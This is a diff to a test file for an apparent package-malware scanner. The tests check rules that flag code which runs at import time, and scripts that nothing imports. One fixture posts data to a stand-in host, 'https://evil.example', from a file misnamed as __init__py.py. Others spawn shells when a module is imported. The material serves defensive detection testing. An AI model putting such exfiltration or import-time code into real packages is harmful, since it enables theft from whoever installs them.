@@ -1,4 +1,4 @@
-"""Tests for static_code_analysis_helpers.py and the rules that read code."""
+"""Tests for rules/helpers/ and the rules that read code."""
 
 import textwrap
 
@@ -17,8 +17,10 @@ from crotalus.rules import (
     import_time_code,
     pth_import_running_code,
     setup_py_install_time,
+    unimported_script_code,
 )
-from crotalus.rules.static_code_analysis_helpers import calls, import_time_calls, read
+from crotalus.rules.helpers.import_time import import_time_calls, modules_run_on_import
+from crotalus.rules.helpers.static_code_analysis import calls, read
 
 
 def call_names(source: str) -> list[str | None]:
@@ -52,7 +54,7 @@ def rule_ids(findings: list[Finding]) -> list[str]:
     return [f.rule_id for f in findings]
 
 
-# static_code_analysis_helpers: resolving names
+# helpers/static_code_analysis: resolving names
 
 
 @pytest.mark.parametrize(
@@ -401,16 +403,57 @@ def test_import_time_code(init_py: str, severity: str) -> None:
         {"pkg/__init__.py": "import subprocess\ndef run():\n    subprocess.run(['x'])"},
         {"pkg/__init__.py": "import os\npath = os.path.join('a', 'b')"},
         {"setup.py": "import os\nos.system('x')"},  # setup_py_install_time's job
-        {"tests/test_pkg.py": "import subprocess\nsubprocess.run(['pytest'])"},
+        {"tests/__init__.py": "import subprocess\nsubprocess.run(['pytest'])"},
         {"pkg/__main__.py": "import subprocess\nsubprocess.run(['x'])"},
         # Settings objects from a network library send nothing.
-        {"pkg/_constants.py": "import httpx\nTIMEOUT = httpx.Timeout(timeout=60)"},
-        {"pkg/api.py": "import requests\nrequests.packages.urllib3.disable_warnings()"},
-        {"pkg/project_template/hooks/post_gen.py": "import subprocess\nsubprocess.run(['x'])"},
+        {"pkg/__init__.py": "import httpx\nTIMEOUT = httpx.Timeout(timeout=60)"},
+        {"pkg/__init__.py": "import requests\nrequests.packages.urllib3.disable_warnings()"},
+        {"pkg/project_template/__init__.py": "import subprocess\nsubprocess.run(['x'])"},
+        {  # a script nothing imports (docoreai's Streamlit launcher): runs only when run
+            "pkg/__init__.py": "from .client import Client",
+            "pkg/client.py": "class Client: pass",
+            "pkg/run_app.py": "import subprocess\nsubprocess.Popen(['streamlit', 'run', 'app.py'])",
+        },
     ],
 )
 def test_import_time_code_that_is_fine(files: dict[str, str]) -> None:
     assert import_time_code.check(context(wheel=files)) == []
+
+
+def test_import_time_code_follows_imports() -> None:
+    files = {
+        "pkg/__init__.py": "from . import _setup",
+        "pkg/_setup.py": "import subprocess\nsubprocess.Popen(['sh', '-c', 'x'])",
+    }
+    findings = import_time_code.check(context(wheel=files))
+    assert findings[0].evidence["files"] == ["pkg/_setup.py"]
+
+
+def test_modules_run_on_import() -> None:
+    files = {
+        "pkg/__init__.py": "from .engine import Engine\nfrom . import util",
+        "pkg/engine.py": "import pkg.sub.deep\ndef later():\n    import pkg.lazy",
+        "pkg/sub/__init__.py": "",
+        "pkg/sub/deep.py": "from ..helpers import h",  # two levels up: pkg.helpers
+        "pkg/helpers.py": "",
+        "pkg/util.py": "",
+        "pkg/lazy.py": "",  # imported inside a function: only when it's called
+        "pkg/app.py": "",  # nothing imports it
+        "six.py": "",  # a top-level module: a root of its own
+        "src/other/__init__.py": "from other.core import x",  # src/ layout
+        "src/other/core.py": "",
+    }
+    assert sorted(modules_run_on_import(files)) == [
+        "pkg/__init__.py",
+        "pkg/engine.py",
+        "pkg/helpers.py",
+        "pkg/sub/__init__.py",
+        "pkg/sub/deep.py",
+        "pkg/util.py",
+        "six.py",
+        "src/other/__init__.py",
+        "src/other/core.py",
+    ]
 
 
 def test_import_time_code_prefers_the_wheel() -> None:
@@ -418,3 +461,42 @@ def test_import_time_code_prefers_the_wheel() -> None:
     fine = {"pkg/__init__.py": "VERSION = '1.0'"}
     assert import_time_code.check(context(sdist=bad, wheel=fine)) == []
     assert rule_ids(import_time_code.check(context(sdist=bad))) == ["import_time_code"]
+
+
+# unimported_script_code
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        {  # a launcher script nothing imports (docoreai)
+            "pkg/__init__.py": "",
+            "pkg/run_app.py": "import subprocess\nsubprocess.Popen(['streamlit', 'run', 'app.py'])",
+        },
+        {  # a typo for __init__.py, so nothing imports it (bytedtrace)
+            "pkg/__init__py.py": "import requests\nrequests.post('https://evil.example', data=d)",
+        },
+    ],
+)
+def test_unimported_script_code(files: dict[str, str]) -> None:
+    findings = unimported_script_code.check(context(wheel=files))
+    assert rule_ids(findings) == ["unimported_script_code"]
+    assert findings[0].severity == "medium"
+
+
+def test_imported_code_is_import_time_codes_job() -> None:
+    files = {"pkg/__init__.py": "import subprocess\nsubprocess.Popen(['sh', '-c', 'x'])"}
+    assert unimported_script_code.check(context(wheel=files)) == []
+    assert rule_ids(import_time_code.check(context(wheel=files))) == ["import_time_code"]
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        {"pkg/cli.py": "import subprocess\nif __name__ == '__main__':\n    subprocess.run(['x'])"},
+        {"pkg/app.py": "import streamlit as st\nst.title('Dashboard')"},
+        {"tests/test_cli.py": "import subprocess\nsubprocess.run(['pytest'])"},
+    ],
+)
+def test_unimported_script_code_that_is_fine(files: dict[str, str]) -> None:
+    assert unimported_script_code.check(context(wheel=files)) == []
